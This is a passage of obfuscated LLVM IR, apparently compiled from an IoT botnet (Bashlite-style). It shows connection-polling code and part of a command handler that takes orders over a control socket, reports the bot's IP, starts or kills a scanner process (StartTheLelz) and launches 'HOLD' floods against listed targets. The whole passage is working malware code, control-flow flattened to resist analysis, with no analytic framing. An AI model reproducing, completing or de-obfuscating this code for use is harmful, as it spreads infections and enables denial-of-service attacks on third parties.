  %141 = sext i32 %140 to i64
  %.reload19 = load volatile %struct.state_t*, %struct.state_t** %.reg2mem6
  %142 = getelementptr inbounds %struct.state_t, %struct.state_t* %.reload19, i64 %141
  %143 = getelementptr inbounds %struct.state_t, %struct.state_t* %142, i32 0, i32 0
  %144 = load i32, i32* %143, align 8
  %145 = sdiv i32 %144, 64
  %146 = sext i32 %145 to i64
  %147 = getelementptr inbounds [16 x i64], [16 x i64]* %139, i64 0, i64 %146
  %148 = load i64, i64* %147, align 8
  %149 = or i64 %148, %138
  store i64 %149, i64* %147, align 8
  %150 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 0
  store i64 0, i64* %150, align 8
  %151 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 1
  store i64 10000, i64* %151, align 8
  %152 = load i32, i32* %8, align 4
  %153 = sext i32 %152 to i64
  %.reload18 = load volatile %struct.state_t*, %struct.state_t** %.reg2mem6
  %154 = getelementptr inbounds %struct.state_t, %struct.state_t* %.reload18, i64 %153
  %155 = getelementptr inbounds %struct.state_t, %struct.state_t* %154, i32 0, i32 0
  %156 = load i32, i32* %155, align 8
  %157 = add nsw i32 %156, 1
  %158 = call i32 @select(i32 %157, %struct.__sigset_t* null, %struct.__sigset_t* %11, %struct.__sigset_t* null, %struct.timeval* %12)
  store i32 %158, i32* %15, align 4
  %159 = load i32, i32* %15, align 4
  %160 = icmp eq i32 %159, 1
  %161 = select i1 %160, i32 -304454362, i32 -971787741
  store i32 %161, i32* %switchVar
  br label %loopEnd

; <label>:162:                                    ; preds = %loopEntry
  store i32 4, i32* %13, align 4
  %163 = load i32, i32* %8, align 4
  %164 = sext i32 %163 to i64
  %.reload17 = load volatile %struct.state_t*, %struct.state_t** %.reg2mem6
  %165 = getelementptr inbounds %struct.state_t, %struct.state_t* %.reload17, i64 %164
  %166 = getelementptr inbounds %struct.state_t, %struct.state_t* %165, i32 0, i32 0
  %167 = load i32, i32* %166, align 8
  %168 = bitcast i32* %14 to i8*
  %169 = call i32 @getsockopt(i32 %167, i32 1, i32 4, i8* %168, i32* %13) #2
  %170 = load i32, i32* %14, align 4
  %171 = icmp ne i32 %170, 0
  %172 = select i1 %171, i32 -1416158762, i32 45062955
  store i32 %172, i32* %switchVar
  br label %loopEnd

; <label>:173:                                    ; preds = %loopEntry
  %174 = load i32, i32* %8, align 4
  %175 = sext i32 %174 to i64
  %.reload16 = load volatile %struct.state_t*, %struct.state_t** %.reg2mem6
  %176 = getelementptr inbounds %struct.state_t, %struct.state_t* %.reload16, i64 %175
  %177 = getelementptr inbounds %struct.state_t, %struct.state_t* %176, i32 0, i32 0
  %178 = load i32, i32* %177, align 8
  %179 = call i32 @close(i32 %178)
  %180 = load i32, i32* %8, align 4
  %181 = sext i32 %180 to i64
  %.reload15 = load volatile %struct.state_t*, %struct.state_t** %.reg2mem6
  %182 = getelementptr inbounds %struct.state_t, %struct.state_t* %.reload15, i64 %181
  %183 = getelementptr inbounds %struct.state_t, %struct.state_t* %182, i32 0, i32 1
  store i8 0, i8* %183, align 4
  store i32 1087579607, i32* %switchVar
  br label %loopEnd

; <label>:184:                                    ; preds = %loopEntry
  %185 = load i32, i32* %8, align 4
  %186 = sext i32 %185 to i64
  %.reload14 = load volatile %struct.state_t*, %struct.state_t** %.reg2mem6
  %187 = getelementptr inbounds %struct.state_t, %struct.state_t* %.reload14, i64 %186
  %188 = getelementptr inbounds %struct.state_t, %struct.state_t* %187, i32 0, i32 1
  store i8 2, i8* %188, align 4
  store i32 1087579607, i32* %switchVar
  br label %loopEnd

; <label>:189:                                    ; preds = %loopEntry
  store i32 -1142307706, i32* %switchVar
  br label %loopEnd

; <label>:190:                                    ; preds = %loopEntry
  %191 = load i32, i32* %15, align 4
  %192 = icmp eq i32 %191, -1
  %193 = select i1 %192, i32 -1048656520, i32 -1742314575
  store i32 %193, i32* %switchVar
  br label %loopEnd

; <label>:194:                                    ; preds = %loopEntry
  %195 = load i32, i32* %8, align 4
  %196 = sext i32 %195 to i64
  %.reload13 = load volatile %struct.state_t*, %struct.state_t** %.reg2mem6
  %197 = getelementptr inbounds %struct.state_t, %struct.state_t* %.reload13, i64 %196
  %198 = getelementptr inbounds %struct.state_t, %struct.state_t* %197, i32 0, i32 0
  %199 = load i32, i32* %198, align 8
  %200 = call i32 @close(i32 %199)
  %201 = load i32, i32* %8, align 4
  %202 = sext i32 %201 to i64
  %.reload12 = load volatile %struct.state_t*, %struct.state_t** %.reg2mem6
  %203 = getelementptr inbounds %struct.state_t, %struct.state_t* %.reload12, i64 %202
  %204 = getelementptr inbounds %struct.state_t, %struct.state_t* %203, i32 0, i32 1
  store i8 0, i8* %204, align 4
  store i32 -1742314575, i32* %switchVar
  br label %loopEnd

; <label>:205:                                    ; preds = %loopEntry
  store i32 -1142307706, i32* %switchVar
  br label %loopEnd

; <label>:206:                                    ; preds = %loopEntry
  store i32 -872560000, i32* %switchVar
  br label %loopEnd

; <label>:207:                                    ; preds = %loopEntry
  store i32 761031310, i32* %switchVar
  br label %loopEnd

; <label>:208:                                    ; preds = %loopEntry
  %209 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %11, i32 0, i32 0
  %210 = getelementptr inbounds [16 x i64], [16 x i64]* %209, i64 0, i64 0
  %211 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %210) #2, !srcloc !8
  %212 = extractvalue { i64, i64* } %211, 0
  %213 = extractvalue { i64, i64* } %211, 1
  %214 = trunc i64 %212 to i32
  store i32 %214, i32* %20, align 4
  %215 = ptrtoint i64* %213 to i64
  %216 = trunc i64 %215 to i32
  store i32 %216, i32* %21, align 4
  store i32 1504536913, i32* %switchVar
  br label %loopEnd

; <label>:217:                                    ; preds = %loopEntry
  store i32 95902391, i32* %switchVar
  br label %loopEnd

; <label>:218:                                    ; preds = %loopEntry
  %219 = load i32, i32* %8, align 4
  %220 = sext i32 %219 to i64
  %.reload11 = load volatile %struct.state_t*, %struct.state_t** %.reg2mem6
  %221 = getelementptr inbounds %struct.state_t, %struct.state_t* %.reload11, i64 %220
  %222 = getelementptr inbounds %struct.state_t, %struct.state_t* %221, i32 0, i32 0
  %223 = load i32, i32* %222, align 8
  %224 = srem i32 %223, 64
  %225 = zext i32 %224 to i64
  %226 = shl i64 1, %225
  %227 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %11, i32 0, i32 0
  %228 = load i32, i32* %8, align 4
  %229 = sext i32 %228 to i64
  %.reload10 = load volatile %struct.state_t*, %struct.state_t** %.reg2mem6
  %230 = getelementptr inbounds %struct.state_t, %struct.state_t* %.reload10, i64 %229
  %231 = getelementptr inbounds %struct.state_t, %struct.state_t* %230, i32 0, i32 0
  %232 = load i32, i32* %231, align 8
  %233 = sdiv i32 %232, 64
  %234 = sext i32 %233 to i64
  %235 = getelementptr inbounds [16 x i64], [16 x i64]* %227, i64 0, i64 %234
  %236 = load i64, i64* %235, align 8
  %237 = or i64 %236, %226
  store i64 %237, i64* %235, align 8
  %238 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 0
  store i64 0, i64* %238, align 8
  %239 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 1
  store i64 10000, i64* %239, align 8
  %240 = load i32, i32* %8, align 4
  %241 = sext i32 %240 to i64
  %.reload9 = load volatile %struct.state_t*, %struct.state_t** %.reg2mem6
  %242 = getelementptr inbounds %struct.state_t, %struct.state_t* %.reload9, i64 %241
  %243 = getelementptr inbounds %struct.state_t, %struct.state_t* %242, i32 0, i32 0
  %244 = load i32, i32* %243, align 8
  %245 = add nsw i32 %244, 1
  %246 = call i32 @select(i32 %245, %struct.__sigset_t* null, %struct.__sigset_t* null, %struct.__sigset_t* %11, %struct.timeval* %12)
  store i32 %246, i32* %15, align 4
  %247 = load i32, i32* %15, align 4
  %248 = icmp ne i32 %247, 0
  %249 = select i1 %248, i32 -1597713565, i32 -636365827
  store i32 %249, i32* %switchVar
  br label %loopEnd

; <label>:250:                                    ; preds = %loopEntry
  %251 = load i32, i32* %8, align 4
  %252 = sext i32 %251 to i64
  %.reload8 = load volatile %struct.state_t*, %struct.state_t** %.reg2mem6
  %253 = getelementptr inbounds %struct.state_t, %struct.state_t* %.reload8, i64 %252
  %254 = getelementptr inbounds %struct.state_t, %struct.state_t* %253, i32 0, i32 0
  %255 = load i32, i32* %254, align 8
  %256 = call i32 @close(i32 %255)
  %257 = load i32, i32* %8, align 4
  %258 = sext i32 %257 to i64
  %.reload7 = load volatile %struct.state_t*, %struct.state_t** %.reg2mem6
  %259 = getelementptr inbounds %struct.state_t, %struct.state_t* %.reload7, i64 %258
  %260 = getelementptr inbounds %struct.state_t, %struct.state_t* %259, i32 0, i32 1
  store i8 0, i8* %260, align 4
  store i32 -636365827, i32* %switchVar
  br label %loopEnd

; <label>:261:                                    ; preds = %loopEntry
  store i32 -872560000, i32* %switchVar
  br label %loopEnd

NewDefault:                                       ; preds = %loopEntry
  store i32 -872560000, i32* %switchVar
  br label %loopEnd

; <label>:262:                                    ; preds = %loopEntry
  store i32 1572905326, i32* %switchVar
  br label %loopEnd

; <label>:263:                                    ; preds = %loopEntry
  %264 = load i32, i32* %8, align 4
  %265 = add nsw i32 %264, 1
  store i32 %265, i32* %8, align 4
  store i32 -109298889, i32* %switchVar
  br label %loopEnd

; <label>:266:                                    ; preds = %loopEntry
  store i32 -1026010168, i32* %switchVar
  br label %loopEnd

; <label>:267:                                    ; preds = %loopEntry
  %268 = load i8*, i8** %10, align 8
  call void @llvm.stackrestore(i8* %268)
  store i32 1448290921, i32* %switchVar
  br label %loopEnd

; <label>:269:                                    ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %267, %266, %263, %262, %NewDefault, %261, %250, %218, %217, %208, %207, %206, %205, %194, %190, %189, %184, %173, %162, %130, %129, %120, %119, %118, %113, %106, %101, %73, %LeafBlock, %LeafBlock1, %NodeBlock, %NodeBlock3, %62, %57, %56, %51, %35, %34, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define void @processCmd(i32, i8**) #0 {
  %.reg2mem = alloca i32
  %3 = alloca i32, align 4
  %4 = alloca i8**, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i8*, align 8
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i8*, align 8
  %11 = alloca i8*, align 8
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i8*, align 8
  %15 = alloca i8*, align 8
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca i8*, align 8
  %22 = alloca i8*, align 8
  %23 = alloca i32, align 4
  %24 = alloca i32, align 4
  %25 = alloca i8*, align 8
  %26 = alloca i8*, align 8
  %27 = alloca i32, align 4
  %28 = alloca i32, align 4
  %29 = alloca i8*, align 8
  %30 = alloca i8*, align 8
  %31 = alloca i32, align 4
  %32 = alloca i32, align 4
  %33 = alloca i8*, align 8
  %34 = alloca i32, align 4
  %35 = alloca i32, align 4
  %36 = alloca i32, align 4
  %37 = alloca i8*, align 8
  %38 = alloca i32, align 4
  %39 = alloca i64, align 8
  store i32 %0, i32* %3, align 4
  store i8** %1, i8*** %4, align 8
  %40 = load i8**, i8*** %4, align 8
  %41 = getelementptr inbounds i8*, i8** %40, i64 0
  %42 = load i8*, i8** %41, align 8
  %43 = call i32 @strcmp(i8* %42, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.71, i32 0, i32 0)) #10
  store i32 %43, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 -68524593, i32* %switchVar
  %.reg2mem2 = alloca i32
  %.reg2mem4 = alloca i32
  %.reg2mem6 = alloca i32
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %2
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -68524593, label %first
    i32 -345530360, label %46
    i32 -228636340, label %49
    i32 1238799273, label %56
    i32 1183610865, label %61
    i32 -1632465017, label %68
    i32 634759472, label %72
    i32 -1996622460, label %75
    i32 -230773412, label %82
    i32 -408942607, label %86
    i32 1376494037, label %87
    i32 -171034863, label %92
    i32 1363299583, label %99
    i32 1340938934, label %103
    i32 -208202162, label %104
    i32 1316224700, label %109
    i32 2037616837, label %111
    i32 1851121573, label %115
    i32 -1995055870, label %116
    i32 2011550722, label %117
    i32 161954918, label %120
    i32 1076220392, label %121
    i32 -345693470, label %128
    i32 -1812795885, label %132
    i32 -956684326, label %139
    i32 584280330, label %146
    i32 909053002, label %147
    i32 -944250007, label %163
    i32 1600224508, label %166
    i32 1820548253, label %170
    i32 1280229674, label %174
    i32 1986517280, label %178
    i32 1053429705, label %180
    i32 -1848230215, label %181
    i32 592400146, label %185
    i32 355336011, label %186
    i32 2078148858, label %190
    i32 -1295710457, label %191
    i32 1181684642, label %198
    i32 -673972009, label %202
    i32 -1395740821, label %209
    i32 -846513337, label %216
    i32 -444753087, label %217
    i32 -196135448, label %233
    i32 913436360, label %236
    i32 857919196, label %240
    i32 -430964991, label %244
    i32 2115519659, label %250
    i32 977709056, label %252
    i32 1996914158, label %253
    i32 -130985062, label %257
    i32 1897058091, label %258
    i32 -893515640, label %262
    i32 941857569, label %263
    i32 369692686, label %270
    i32 -714889944, label %274
    i32 -1376395269, label %281
    i32 1577938838, label %288
    i32 -99342012, label %295
    i32 787995795, label %302
    i32 -681525212, label %306
    i32 -13413661, label %313
    i32 1182314484, label %314
    i32 2130588136, label %333
    i32 56576609, label %338
    i32 212063821, label %339
    i32 -1394308151, label %344
    i32 -1111190080, label %347
    i32 -1841565672, label %351
    i32 10012054, label %355
    i32 -1622057979, label %362
    i32 1504313527, label %364
    i32 -386249470, label %365
    i32 966926369, label %369
    i32 -890208537, label %370
    i32 -866439040, label %377
    i32 14273515, label %378
    i32 1848052928, label %385
    i32 2044899162, label %389
    i32 2005647079, label %396
    i32 -2011345444, label %403
    i32 1909561772, label %404
    i32 -489127888, label %408
    i32 703537616, label %409
    i32 1693745776, label %432
    i32 -1532355842, label %439
    i32 1003282710, label %443
    i32 578538595, label %450
    i32 -940949035, label %457
    i32 -2020369682, label %458
    i32 49795550, label %474
    i32 -131838849, label %477
    i32 91182917, label %481
    i32 621207311, label %485
    i32 885112850, label %491
    i32 656372580, label %493
    i32 -1664256017, label %494
    i32 149341453, label %498
    i32 -115041051, label %499
    i32 -344849041, label %503
    i32 -1267775492, label %504
    i32 -1427046761, label %511
    i32 -2005832662, label %515
    i32 -678478359, label %522
    i32 1590091019, label %529
    i32 1897191281, label %530
    i32 1173720011, label %546
    i32 1899889429, label %549
    i32 1145461812, label %553
    i32 -1606464619, label %557
    i32 -84726063, label %566
    i32 844411420, label %568
    i32 -696250552, label %569
    i32 -268290687, label %573
    i32 609316863, label %574
    i32 -197856700, label %581
    i32 306126066, label %582
    i32 -653314166, label %589
    i32 -335492300, label %593
    i32 316214779, label %600
    i32 -115788635, label %607
    i32 -18434674, label %611
    i32 491782243, label %618
    i32 -1409490278, label %622
    i32 -1897181835, label %629
    i32 942124837, label %630
    i32 1623598919, label %648
    i32 247826622, label %653
    i32 -187800883, label %654
    i32 132434357, label %658
    i32 2094256973, label %663
    i32 -424260650, label %664
    i32 -296094000, label %669
    i32 -333345903, label %672
    i32 835682556, label %676
    i32 -1475367385, label %680
    i32 -1660538233, label %688
    i32 -1766226886, label %690
    i32 -2025451113, label %691
    i32 603983745, label %695
    i32 1763988205, label %696
    i32 1234883779, label %704
    i32 -174055280, label %705
    i32 1873992656, label %712
    i32 -1672390657, label %713
    i32 -1893758695, label %718
    i32 1744377958, label %725
    i32 -1774076593, label %733
    i32 -887669265, label %741
    i32 207364916, label %742
    i32 -695588322, label %745
    i32 -1308116335, label %746
    i32 -63161668, label %753
    i32 -2146890788, label %754
    i32 1000124678, label %761
    i32 196278165, label %770
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %44 = icmp ne i32 %.reload, 0
  %45 = select i1 %44, i32 -228636340, i32 -345530360
  store i32 %45, i32* %switchVar
  br label %loopEnd

; <label>:46:                                     ; preds = %loopEntry
  %47 = load i32, i32* @mainCommSock, align 4
  %48 = call i32 (i32, i8*, ...) @sockprintf(i32 %47, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.90, i32 0, i32 0))
  store i32 196278165, i32* %switchVar
  br label %loopEnd

; <label>:49:                                     ; preds = %loopEntry
  %50 = load i8**, i8*** %4, align 8
  %51 = getelementptr inbounds i8*, i8** %50, i64 0
  %52 = load i8*, i8** %51, align 8
  %53 = call i32 @strcmp(i8* %52, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.91, i32 0, i32 0)) #10
  %54 = icmp ne i32 %53, 0
  %55 = select i1 %54, i32 1183610865, i32 1238799273
  store i32 %55, i32* %switchVar
  br label %loopEnd

; <label>:56:                                     ; preds = %loopEntry
  %57 = load i32, i32* @mainCommSock, align 4
  %58 = load i32, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i32 0, i32 0), align 4
  %59 = call i8* @inet_ntoa(i32 %58) #2
  %60 = call i32 (i32, i8*, ...) @sockprintf(i32 %57, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.92, i32 0, i32 0), i8* %59)
  store i32 196278165, i32* %switchVar
  br label %loopEnd

; <label>:61:                                     ; preds = %loopEntry
  %62 = load i8**, i8*** %4, align 8
  %63 = getelementptr inbounds i8*, i8** %62, i64 0
  %64 = load i8*, i8** %63, align 8
  %65 = call i32 @strcmp(i8* %64, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.93, i32 0, i32 0)) #10
  %66 = icmp ne i32 %65, 0
  %67 = select i1 %66, i32 1076220392, i32 -1632465017
  store i32 %67, i32* %switchVar
  br label %loopEnd

; <label>:68:                                     ; preds = %loopEntry
  %69 = load i32, i32* %3, align 4
  %70 = icmp ne i32 %69, 2
  %71 = select i1 %70, i32 634759472, i32 -1996622460
  store i32 %71, i32* %switchVar
  br label %loopEnd

; <label>:72:                                     ; preds = %loopEntry
  %73 = load i32, i32* @mainCommSock, align 4
  %74 = call i32 (i32, i8*, ...) @sockprintf(i32 %73, i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.94, i32 0, i32 0))
  store i32 196278165, i32* %switchVar
  br label %loopEnd

; <label>:75:                                     ; preds = %loopEntry
  %76 = load i8**, i8*** %4, align 8
  %77 = getelementptr inbounds i8*, i8** %76, i64 1
  %78 = load i8*, i8** %77, align 8
  %79 = call i32 @strcmp(i8* %78, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.95, i32 0, i32 0)) #10
  %80 = icmp ne i32 %79, 0
  %81 = select i1 %80, i32 -171034863, i32 -230773412
  store i32 %81, i32* %switchVar
  br label %loopEnd

; <label>:82:                                     ; preds = %loopEntry
  %83 = load i32, i32* @scanPid, align 4
  %84 = icmp eq i32 %83, 0
  %85 = select i1 %84, i32 -408942607, i32 1376494037
  store i32 %85, i32* %switchVar
  br label %loopEnd

; <label>:86:                                     ; preds = %loopEntry
  store i32 196278165, i32* %switchVar
  br label %loopEnd

; <label>:87:                                     ; preds = %loopEntry
  %88 = load i32, i32* @scanPid, align 4
  %89 = call i32 @kill(i32 %88, i32 9) #2
  %90 = load i32, i32* @mainCommSock, align 4
  %91 = call i32 (i32, i8*, ...) @sockprintf(i32 %90, i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.96, i32 0, i32 0))
  store i32 0, i32* @scanPid, align 4
  store i32 -171034863, i32* %switchVar
  br label %loopEnd

; <label>:92:                                     ; preds = %loopEntry
  %93 = load i8**, i8*** %4, align 8
  %94 = getelementptr inbounds i8*, i8** %93, i64 1
  %95 = load i8*, i8** %94, align 8
  %96 = call i32 @strcmp(i8* %95, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.97, i32 0, i32 0)) #10
  %97 = icmp ne i32 %96, 0
  %98 = select i1 %97, i32 161954918, i32 1363299583
  store i32 %98, i32* %switchVar
  br label %loopEnd

; <label>:99:                                     ; preds = %loopEntry
  %100 = load i32, i32* @scanPid, align 4
  %101 = icmp ne i32 %100, 0
  %102 = select i1 %101, i32 1340938934, i32 -208202162
  store i32 %102, i32* %switchVar
  br label %loopEnd

; <label>:103:                                    ; preds = %loopEntry
  store i32 196278165, i32* %switchVar
  br label %loopEnd

; <label>:104:                                    ; preds = %loopEntry
  %105 = call i32 @fork() #2
  store i32 %105, i32* %6, align 4
  %106 = load i32, i32* %6, align 4
  %107 = icmp ugt i32 %106, 0
  %108 = select i1 %107, i32 1316224700, i32 2037616837
  store i32 %108, i32* %switchVar
  br label %loopEnd

; <label>:109:                                    ; preds = %loopEntry
  %110 = load i32, i32* %6, align 4
  store i32 %110, i32* @scanPid, align 4
  store i32 196278165, i32* %switchVar
  br label %loopEnd

; <label>:111:                                    ; preds = %loopEntry
  %112 = load i32, i32* %6, align 4
  %113 = icmp eq i32 %112, -1
  %114 = select i1 %113, i32 1851121573, i32 -1995055870
  store i32 %114, i32* %switchVar
  br label %loopEnd

; <label>:115:                                    ; preds = %loopEntry
  store i32 196278165, i32* %switchVar
  br label %loopEnd

; <label>:116:                                    ; preds = %loopEntry
  store i32 2011550722, i32* %switchVar
  br label %loopEnd

; <label>:117:                                    ; preds = %loopEntry
  %118 = load i32, i32* @mainCommSock, align 4
  %119 = call i32 (i32, i8*, ...) @sockprintf(i32 %118, i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.98, i32 0, i32 0))
  call void @StartTheLelz()
  call void @_exit(i32 0) #12
  unreachable

; <label>:120:                                    ; preds = %loopEntry
  store i32 1076220392, i32* %switchVar
  br label %loopEnd

; <label>:121:                                    ; preds = %loopEntry
  %122 = load i8**, i8*** %4, align 8
  %123 = getelementptr inbounds i8*, i8** %122, i64 0
  %124 = load i8*, i8** %123, align 8
  %125 = call i32 @strcmp(i8* %124, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.99, i32 0, i32 0)) #10
  %126 = icmp ne i32 %125, 0
  %127 = select i1 %126, i32 -1295710457, i32 -345693470
  store i32 %127, i32* %switchVar
  br label %loopEnd

; <label>:128:                                    ; preds = %loopEntry
  %129 = load i32, i32* %3, align 4
  %130 = icmp slt i32 %129, 4
  %131 = select i1 %130, i32 584280330, i32 -1812795885
  store i32 %131, i32* %switchVar
  br label %loopEnd

; <label>:132:                                    ; preds = %loopEntry
  %133 = load i8**, i8*** %4, align 8
  %134 = getelementptr inbounds i8*, i8** %133, i64 2
  %135 = load i8*, i8** %134, align 8
  %136 = call i32 @atoi(i8* %135) #10
  %137 = icmp slt i32 %136, 1
  %138 = select i1 %137, i32 584280330, i32 -956684326
  store i32 %138, i32* %switchVar
  br label %loopEnd

; <label>:139:                                    ; preds = %loopEntry
  %140 = load i8**, i8*** %4, align 8
  %141 = getelementptr inbounds i8*, i8** %140, i64 3
  %142 = load i8*, i8** %141, align 8
  %143 = call i32 @atoi(i8* %142) #10
  %144 = icmp slt i32 %143, 1
  %145 = select i1 %144, i32 584280330, i32 909053002
  store i32 %145, i32* %switchVar
  br label %loopEnd

; <label>:146:                                    ; preds = %loopEntry
  store i32 196278165, i32* %switchVar
  br label %loopEnd

; <label>:147:                                    ; preds = %loopEntry
  %148 = load i8**, i8*** %4, align 8
  %149 = getelementptr inbounds i8*, i8** %148, i64 1
  %150 = load i8*, i8** %149, align 8
  store i8* %150, i8** %7, align 8
  %151 = load i8**, i8*** %4, align 8
  %152 = getelementptr inbounds i8*, i8** %151, i64 2
  %153 = load i8*, i8** %152, align 8
  %154 = call i32 @atoi(i8* %153) #10
  store i32 %154, i32* %8, align 4
  %155 = load i8**, i8*** %4, align 8
  %156 = getelementptr inbounds i8*, i8** %155, i64 3
  %157 = load i8*, i8** %156, align 8
  %158 = call i32 @atoi(i8* %157) #10
  store i32 %158, i32* %9, align 4
  %159 = load i8*, i8** %7, align 8
  %160 = call i8* @strstr(i8* %159, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.84, i32 0, i32 0)) #10
  %161 = icmp ne i8* %160, null
  %162 = select i1 %161, i32 -944250007, i32 -1848230215
  store i32 %162, i32* %switchVar
  br label %loopEnd

; <label>:163:                                    ; preds = %loopEntry
  %164 = load i8*, i8** %7, align 8
  %165 = call i8* @strtok(i8* %164, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.84, i32 0, i32 0)) #2
  store i8* %165, i8** %10, align 8
  store i32 1600224508, i32* %switchVar
  br label %loopEnd

; <label>:166:                                    ; preds = %loopEntry
  %167 = load i8*, i8** %10, align 8
  %168 = icmp ne i8* %167, null
  %169 = select i1 %168, i32 1820548253, i32 1053429705
  store i32 %169, i32* %switchVar
  br label %loopEnd

; <label>:170:                                    ; preds = %loopEntry
  %171 = call i32 @listFork()
  %172 = icmp ne i32 %171, 0
  %173 = select i1 %172, i32 1986517280, i32 1280229674
  store i32 %173, i32* %switchVar
  br label %loopEnd

; <label>:174:                                    ; preds = %loopEntry
  %175 = load i8*, i8** %10, align 8
  %176 = load i32, i32* %8, align 4
  %177 = load i32, i32* %9, align 4
  call void @sendHOLD(i8* %175, i32 %176, i32 %177)
  call void @_exit(i32 0) #12
  unreachable

; <label>:178:                                    ; preds = %loopEntry
  %179 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.84, i32 0, i32 0)) #2
  store i8* %179, i8** %10, align 8
  store i32 1600224508, i32* %switchVar
  br label %loopEnd

; <label>:180:                                    ; preds = %loopEntry
  store i32 2078148858, i32* %switchVar
  br label %loopEnd

; <label>:181:                                    ; preds = %loopEntry
  %182 = call i32 @listFork()
  %183 = icmp ne i32 %182, 0
  %184 = select i1 %183, i32 592400146, i32 355336011
  store i32 %184, i32* %switchVar
  br label %loopEnd

; <label>:185:                                    ; preds = %loopEntry
  store i32 196278165, i32* %switchVar
  br label %loopEnd

; <label>:186:                                    ; preds = %loopEntry
  %187 = load i8*, i8** %7, align 8
  %188 = load i32, i32* %8, align 4
  %189 = load i32, i32* %9, align 4
  call void @sendHOLD(i8* %187, i32 %188, i32 %189)
  call void @_exit(i32 0) #12
  unreachable

; <label>:190:                                    ; preds = %loopEntry
  store i32 -1295710457, i32* %switchVar
  br label %loopEnd

; <label>:191:                                    ; preds = %loopEntry
  %192 = load i8**, i8*** %4, align 8
  %193 = getelementptr inbounds i8*, i8** %192, i64 0
  %194 = load i8*, i8** %193, align 8
  %195 = call i32 @strcmp(i8* %194, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.100, i32 0, i32 0)) #10
  %196 = icmp ne i32 %195, 0
  %197 = select i1 %196, i32 941857569, i32 1181684642
  store i32 %197, i32* %switchVar
  br label %loopEnd

; <label>:198:                                    ; preds = %loopEntry
  %199 = load i32, i32* %3, align 4
  %200 = icmp slt i32 %199, 4
  %201 = select i1 %200, i32 -846513337, i32 -673972009
  store i32 %201, i32* %switchVar
  br label %loopEnd

; <label>:202:                                    ; preds = %loopEntry
  %203 = load i8**, i8*** %4, align 8
  %204 = getelementptr inbounds i8*, i8** %203, i64 2
  %205 = load i8*, i8** %204, align 8
  %206 = call i32 @atoi(i8* %205) #10
  %207 = icmp slt i32 %206, 1
  %208 = select i1 %207, i32 -846513337, i32 -1395740821
  store i32 %208, i32* %switchVar
  br label %loopEnd

; <label>:209:                                    ; preds = %loopEntry
  %210 = load i8**, i8*** %4, align 8
  %211 = getelementptr inbounds i8*, i8** %210, i64 3
  %212 = load i8*, i8** %211, align 8
  %213 = call i32 @atoi(i8* %212) #10
  %214 = icmp slt i32 %213, 1
  %215 = select i1 %214, i32 -846513337, i32 -444753087
  store i32 %215, i32* %switchVar
  br label %loopEnd

; <label>:216:                                    ; preds = %loopEntry
  store i32 196278165, i32* %switchVar
  br label %loopEnd

; <label>:217:                                    ; preds = %loopEntry
  %218 = load i8**, i8*** %4, align 8
  %219 = getelementptr inbounds i8*, i8** %218, i64 1
  %220 = load i8*, i8** %219, align 8
  store i8* %220, i8** %11, align 8
  %221 = load i8**, i8*** %4, align 8
  %222 = getelementptr inbounds i8*, i8** %221, i64 2
  %223 = load i8*, i8** %222, align 8
  %224 = call i32 @atoi(i8* %223) #10
  store i32 %224, i32* %12, align 4
  %225 = load i8**, i8*** %4, align 8
  %226 = getelementptr inbounds i8*, i8** %225, i64 3
  %227 = load i8*, i8** %226, align 8
  %228 = call i32 @atoi(i8* %227) #10
  store i32 %228, i32* %13, align 4
  %229 = load i8*, i8** %11, align 8
  %230 = call i8* @strstr(i8* %229, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.84, i32 0, i32 0)) #10
  %231 = icmp ne i8* %230, null
  %232 = select i1 %231, i32 -196135448, i32 1996914158
  store i32 %232, i32* %switchVar
  br label %loopEnd

; <label>:233:                                    ; preds = %loopEntry
  %234 = load i8*, i8** %11, align 8
  %235 = call i8* @strtok(i8* %234, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.84, i32 0, i32 0)) #2
  store i8* %235, i8** %14, align 8
  store i32 913436360, i32* %switchVar
  br label %loopEnd

; <label>:236:                                    ; preds = %loopEntry
  %237 = load i8*, i8** %14, align 8
  %238 = icmp ne i8* %237, null
  %239 = select i1 %238, i32 857919196, i32 977709056
  store i32 %239, i32* %switchVar
  br label %loopEnd

; <label>:240:                                    ; preds = %loopEntry
